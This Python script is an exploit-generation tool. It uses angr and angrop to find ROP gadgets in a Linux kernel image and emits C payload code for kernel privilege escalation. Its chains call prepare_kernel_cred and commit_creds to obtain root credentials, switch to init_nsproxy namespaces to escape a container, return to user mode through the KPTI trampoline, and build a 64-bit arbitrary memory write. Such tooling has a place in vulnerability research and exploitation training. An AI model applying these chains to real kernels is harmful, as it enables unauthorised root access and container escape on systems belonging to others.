#!/usr/bin/env -S python3 -u

import argparse
import os
import pathlib

import angr
import angrop
from angrop.rop_gadget import RopGadget
from rop_chain import *
from rop_ret_patcher import patch_vmlinux_return_thunk
from rop_util import load_symbols

BIT_SIZE = 64
PREPARE_KERNEL_CRED = "prepare_kernel_cred"
COMMIT_KERNEL_CRED = "commit_creds"
FIND_TASK_BY_VPID = "find_task_by_vpid"
SWITCH_TASK_NAMESPACES = "switch_task_namespaces"
PARSE_MOUNT_OPTIONS = "parse_mount_options"
KPTI_TRAMPOLINE = "swapgs_restore_regs_and_return_to_usermode"
INIT_NSPROXY = "init_nsproxy"
CORE_PATTERN = "core_pattern"
MSLEEP = "msleep"
FORK = "__do_sys_vfork"

ROP_C_FORMAT = "*(rop++) = {};"
ROP_REBASE_C_FORMAT = "*(rop++) = kbase + {};"

KERNEL_BASE_ADDRESS = 0xffffffff81000000


class RopGeneratorError(Exception):
    """Exception class for RopGenerator errors."""

    def __init__(self, message):
        super().__init__(message)


class RopGeneratorAngrop:
    """Generates ROP chains using angrop."""

    def __init__(self, vmlinux_path) -> None:
        """Initializes the ROP generator.

        Args:
          vmlinux_path: path to the vmlinux file
        """
        self._vmlinux_path = vmlinux_path
        self._project = angr.Project(vmlinux_path, perform_relocations=False)
        self._symbol_map = load_symbols(vmlinux_path)
        self._addr_to_symbol = {
            addr: name for name, addr in self._symbol_map.items()
        }
        # vmlinux is not marked PIE but we want the rebase option in angrop turned
        # on
        self._project.loader.main_object.pic = True
        # hack to only rebase the correct values
        self._project.loader.main_object.mapped_base = (
            self._project.loader.main_object.segments[0].vaddr
        )
        self._kpti_trampoline = self._find_kpti_trampoline()
        self._rop = self._load_angrop()

    def _find_symbol_addr(self, func_name):
        return self._symbol_map.get(func_name)

    def _find_symbol(self, func_name):
        return RopChainOffset(self._find_symbol_addr(func_name) - KERNEL_BASE_ADDRESS)

    def _find_symbol_name(self, addr):
        return self._addr_to_symbol.get(addr)

    def _load_angrop(self):
        rop = self._project.analyses.ROP(kernel_mode=True, fast_mode=True)
        # rop.load_gadgets("angrop_gadgets_1")
        rop.find_gadgets(processes=os.cpu_count())
        # rop.save_gadgets("angrop_gadgets_1")
        return rop

    def _find_pop_one_reg(self, reg_name):
        """Finds a gadget that pops one register.

        Args:
          reg_name: the register to pop

        Returns:
          the gadget

        Raises:
          RopGeneratorAngropError: if no gadget is found
        """
        shortest_gadget = None

        for gadget in self._rop.rop_gadgets:
            if gadget.changed_regs == {reg_name} and gadget.popped_regs == {reg_name}:
                if (
                    shortest_gadget is None
                    or gadget.block_length < shortest_gadget.block_length
                ):
                    shortest_gadget = gadget

        if shortest_gadget:
            return shortest_gadget.addr - KERNEL_BASE_ADDRESS
        else:
            raise RopGeneratorError(
                f"No pop gadget found for the register {reg_name}"
            )

    def _mov_reg_rax(self, reg_name):
        chain_mov_regs = self._rop.move_regs(**{reg_name: "rax"})
        items = []
        for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
            if rebased:
                items.append(RopChainOffset(value - KERNEL_BASE_ADDRESS))
            else:
                items.append(RopChainConstant(value))

        return items

    def find_memory_write(self):
        """Finds the shortest ROP gadget with a single memory write where the address is controlled by 'rsi' 
        and the data is controlled by 'rdi', writing 64 bits of data."""

        # TODO use angrop directly when issue is handled

        shortest_gadget = None

        for gadget in self._rop.rop_gadgets:
            if len(gadget.mem_writes) == 1:  # Consider only gadgets with exactly one memory write
                mem_write = gadget.mem_writes[0]

                if (
                    mem_write.addr_controllers == ['rsi']
                    and mem_write.data_controllers == ['rdi']
                    and mem_write.data_size == 64
                ):
                    if shortest_gadget is None or gadget.block_length < shortest_gadget.block_length:
                        shortest_gadget = gadget

        if shortest_gadget:
            return shortest_gadget.addr - KERNEL_BASE_ADDRESS
        else:
            raise RopGeneratorError("No suitable memory writes found")

    def build_rop_chain(self):
        """Builds the ROP chain.

        Returns:
          Printable ROP chain

        """
        chain = self._rop.func_call(
            self._find_symbol_addr(PREPARE_KERNEL_CRED), [0]
        )
        chain += self._rop.move_regs(rdi="rax")
        chain += self._rop.func_call(
            self._find_symbol_addr(COMMIT_KERNEL_CRED), []
        )
        chain += self._rop.func_call(
            self._find_symbol_addr(FIND_TASK_BY_VPID), [1]
        )
        chain += self._rop.move_regs(rdi="rax")
        chain += self._rop.set_regs(
            rsi=self._find_symbol_addr(INIT_NSPROXY),
            preserve_regs=("rdi",)
        )
        chain += self._rop.func_call(
            self._find_symbol_addr(SWITCH_TASK_NAMESPACES), []
        )
        chain.add_gadget(RopGadget(self._kpti_trampoline))
        chain.add_value(0)
        chain.add_value(0)
        return chain

    def _find_kpti_trampoline(self):
        """Finds the address of the kPTI trampoline.

        Returns:
          The address of the kPTI trampoline.
        """
        init_block = self._project.factory.block(
            self._find_symbol_addr(KPTI_TRAMPOLINE)
        )
        next_block = self._project.factory.block(
            list(init_block.vex.constant_jump_targets)[0]
        )
        for ins in next_block.disassembly.insns:
            if ins.mnemonic == "mov" and "rdi, rsp" in ins.op_str:
                # add to symbol map
                self._symbol_map["kpti_trampoline"] = ins.address
                self._addr_to_symbol[ins.address] = "kpti_trampoline"
                return ins.address

    def payload_c_code(self, rop_chain, print_instructions=True):
        """Prints the C code for the ROP chain.

        Args:
          rop_chain: the rop chain to print
          print_instructions: whether to print the rop gadget instructions.

        Returns:
          prints the code for the rop payload
        """
        payload = ""

        concrete_vals = rop_chain._concretize_chain_values(
        )  # pylint: disable=protected-access
        for value, rebased in concrete_vals:

            instruction_code = ""
            if print_instructions:
                sec = self._project.loader.find_section_containing(value)
                if sec and sec.is_executable:
                    symbol_name = self._find_symbol_name(value)
                    if symbol_name:
                        asmstring = symbol_name
                    else:
                        asmstring = angrop.rop_utils.addr_to_asmstring(
                            self._project, value)
                    if asmstring:
                        instruction_code = "\t// " + asmstring

            if rebased:
                # Get the base address from the first segment
                value -= self._project.loader.main_object.segments[0].vaddr
                payload += ROP_REBASE_C_FORMAT.format(
                    hex(value)) + instruction_code
            else:
                payload += ROP_C_FORMAT.format(hex(value)) + instruction_code
            payload += "\n"

        # add the user variables
        payload += ROP_C_FORMAT.format(
            "/* TODO: put userspace function name here */"
        )
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved cs variable name here*/")
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved rflags variable name here*/"
        )
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved stack pointer variable name here*/"
        )
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved ss variable name here*/")
        payload += "\n"

        return payload

    def rop_action_msleep(self, msecs: RopChainConstant | RopChainArgument):
        """Constructs a ROP chain to trigger a sleep for the specified milliseconds.

        Args:
            msecs: The number of milliseconds to sleep for.

        Returns:
            RopChain: The constructed ROP chain to execute the `msleep` function.
        """
        return RopChain([
            RopChainOffset(self._find_pop_one_reg("rdi")),
            msecs,
            self._find_symbol(MSLEEP),
        ])

    def rop_action_commit_creds(self):
        """Constructs a ROP action to commit creds.

        Returns:
            RopChain: The constructed ROP chain.
        """
        items = [
            RopChainOffset(self._find_pop_one_reg("rdi")),
            RopChainConstant(0),
            self._find_symbol(PREPARE_KERNEL_CRED),
        ]

        items.extend(self._mov_reg_rax("rdi"))
        items.append(self._find_symbol(COMMIT_KERNEL_CRED))

        return RopChain(items)

    def rop_action_switch_task_namespaces(self):
        """Constructs a ROP action to call fswitch_task_namespaces.

        Returns:
            RopChain: The constructed ROP chain.
        """
        items = [
            RopChainOffset(self._find_pop_one_reg("rdi")),
            RopChainConstant(1),
            self._find_symbol(FIND_TASK_BY_VPID),
        ]

        items.extend(self._mov_reg_rax("rdi"))
        items.extend([
            RopChainOffset(self._find_pop_one_reg("rsi")),
            self._find_symbol(INIT_NSPROXY),
        ])
        items.append(self._find_symbol(SWITCH_TASK_NAMESPACES))

        return RopChain(items)

    def rop_action_ret_via_kpti_retpoline(
        self,
        user_rip: RopChainArgument,
        user_cs: RopChainArgument,
        user_rflags: RopChainArgument,
        user_sp: RopChainArgument,
        user_ss: RopChainArgument,
    ):
        """Constructs a kpti trampoline rop chain.

        Returns:
            RopChain: The constructed ROP chain.
        """
        return RopChain([
            RopChainOffset(self._kpti_trampoline - KERNEL_BASE_ADDRESS),
            RopChainConstant(0),
            RopChainConstant(0),
            user_rip,
            user_cs,
            user_rflags,
            user_sp,
            user_ss,
        ])

    def rop_action_fork(self):
        return RopChain([self._find_symbol(FORK)])

    def rop_action_write_what_where_64(self, address, value):
        """Constructs a rop chain to write a 64 bit value to an address.

        Returns:
           RopChain: The constructed ROP chain.
        """
        items = [RopChainOffset(self._find_pop_one_reg("rdi")),
                 address,
                 RopChainOffset(self._find_pop_one_reg("rsi")),
                 value,
                 RopChainOffset(self.find_memory_write())]

        return RopChain(items)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generates ROP payloads for linux kernel images"
    )
    parser.add_argument("vmlinux_path", help="Path to vmlinux file")
    args = parser.parse_args()
    patched_vmlinux_path = pathlib.Path(
        args.vmlinux_path
    ).with_suffix(".thunk_replaced")
    if not patched_vmlinux_path.exists():
        patch_vmlinux_return_thunk(args.vmlinux_path, patched_vmlinux_path)
    rop_generator = RopGeneratorAngrop(patched_vmlinux_path)
    chain = rop_generator.build_rop_chain()
    payload_code = rop_generator.payload_c_code(chain)
    print(payload_code)
    print("\n")
    action_sleep = rop_generator.rop_action_msleep(RopChainArgument(0))
    print("sleep\n" + repr(action_sleep) + '\n\n')
    action_commit_creds = rop_generator.rop_action_commit_creds()
    print("Commit Creds\n" + repr(action_commit_creds) + '\n\n')
    action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces()
    print("Switch task Namepspace\n" +
          repr(action_switch_task_namespace) + '\n\n')
    action_write_what_where_64 = rop_generator.rop_action_write_what_where_64(
        RopChainConstant(0x414141414141), RopChainConstant(5678))
    print("Write What Where (64 bits)\n" +
          repr(action_write_what_where_64) + '\n\n')
